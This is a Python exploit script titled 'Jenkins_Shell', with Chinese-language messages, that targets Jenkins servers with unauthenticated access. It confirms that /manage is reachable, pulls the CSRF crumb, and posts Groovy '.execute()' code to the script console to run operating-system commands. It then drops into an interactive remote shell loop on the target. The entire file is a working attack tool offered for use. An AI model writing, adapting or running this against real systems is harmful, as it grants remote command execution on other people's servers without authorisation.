import requests
import argparse
import re
def ascii():
    print('''
    _____                     __         _                                        __                __    __   
   |_   _|                   [  |  _    (_)                                      [  |              [  |  [  |  
     | |    .---.   _ .--.    | | / ]   __    _ .--.    .--.              .--.    | |--.    .---.   | |   | |  
 _   | |   / /__\\ [ `.-. |   | '' <   [  |  [ `.-. |  ( (`\]            ( (`\]   | .-. |  / /__\\  | |   | |  
| |__' |   | \__.,  | | | |   | |`\ \   | |   | | | |   `'.'.   _______   `'.'.   | | | |  | \__.,  | |   | |  
`.____.'    '.__.' [___||__] [__|  \_] [___] [___||__] [\__) ) |_______| [\__) ) [___]|__]  '.__.' [___] [___]
                                                                                    +----------------------+
                                                                                    + Title : Jenkins_Shell+
                                                                                    + Author: g0ubu1i      +
                                                                                    +----------------------+
''')
def verify(url):
    if url[:4] != 'http':
        url = 'http://' + url
    manage_url = url + '/manage'
    response = requests.get(manage_url)
    if response.status_code == 200 and 'Jenkins' in response.text:
        print('[+] Jenkins 未授权访问漏洞存在！')
        return True
    else:
        print('[-] Jenkins 未授权访问漏洞不存在！')
        return False
def cmd(session,command,crumb_value,script_url):
    data = {
        "script": f'println "{command}".execute().text',
        "Submit": "",
        "Jenkins-Crumb": crumb_value,
        "json": '{"script":"println \\"'+command+'\\".execute().text","":"","Submit":"","Jenkins-Crumb":"'+crumb_value+'"}'
    }
    response = session.post(script_url, data=data, headers={
    })
    if response.status_code == 200 and 'java.io.IOException: error' not in response.text:
        return re.findall(r'</h2><pre>(.*?)</pre>', response.text, re.DOTALL | re.IGNORECASE)[0]
    else:
        return False
def exploit(url):
    session = requests.Session()
    if url[:4] != 'http':
        url = 'http://' + url
    manage_url = url + '/manage/'
    crumb_response = session.get(manage_url)
    pattern = re.compile(r'data-crumb-value="([^"]+)"')
    crumb_value = pattern.search(crumb_response.text).group(1)
    script_url = url + "/manage/script/"
    # 获取系统信息
    os_info_linux = cmd(session, 'uname -a', crumb_value, script_url)
    os_info_windows = cmd(session, 'ver', crumb_value, script_url)
    if os_info_linux and os_info_linux != False:
        print(f'[+] 系统信息:{os_info_linux}')
    # 检查 Windows 信息是否有效
    elif os_info_windows and os_info_windows != False:
        print(f'[+] 系统信息:{os_info_windows}')
    else:
        # 如果两者都为 False，返回错误信息
        print('[-] 获取系统信息失败')
    print("[+] 进入shell模式")
    while True:
        try:
            user_input = input("shell$>>  ").strip()
            if user_input.lower() == "exit":
                print("[-] 退出 Shell 界面。")
                break
            if user_input:
                result = cmd(session, user_input, crumb_value, script_url)
                print(result)
        except KeyboardInterrupt:
            print("\n捕获到中断信号，退出 Shell 界面。")
            break
        except Exception as e:
            print(f"发生错误: {e}")
def main():
    parser = argparse.ArgumentParser(description='Jenkins 未授权访问漏洞利用脚本')
    parser.add_argument('-u', '--url', help='目标URL', required=True)
    args = parser.parse_args()
    ascii()
    print(f'[+] testing:{args.url}')
    if verify(args.url):
        exploit(args.url)

if __name__ == '__main__':
    main()








